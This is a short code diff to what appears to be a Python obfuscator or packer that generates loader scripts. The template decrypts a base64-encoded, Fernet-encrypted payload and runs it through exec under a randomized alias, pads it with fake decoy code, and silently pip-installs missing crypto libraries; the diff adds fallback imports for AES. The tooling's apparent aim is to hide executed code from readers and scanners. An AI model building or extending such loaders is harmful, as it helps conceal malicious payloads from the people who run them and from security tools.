@@ -137,10 +137,17 @@ for modl in requirements:
     except:
         subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
         time.sleep(3)
-        
+
 import requests
 
 from cryptography.fernet import Fernet as {a}
+
+try:
+    from Cryptodome.Cipher import AES
+except:
+    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
+    from Crypto.Cipher import AES
+    
 encoded_code = "{encoded_code}"
 {e} = exec
 encrypted_code = base64.b64decode(encoded_code)
@@ -199,7 +206,12 @@ try:
 except:
     subprocess.run("python -m pip install requests", shell=True)
 
-from Cryptodome.Cipher import AES
+try:
+    from Cryptodome.Cipher import AES
+except:
+    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
+    from Crypto.Cipher import AES
+
 import requests
 {all_fake_code}
 {e} = exec
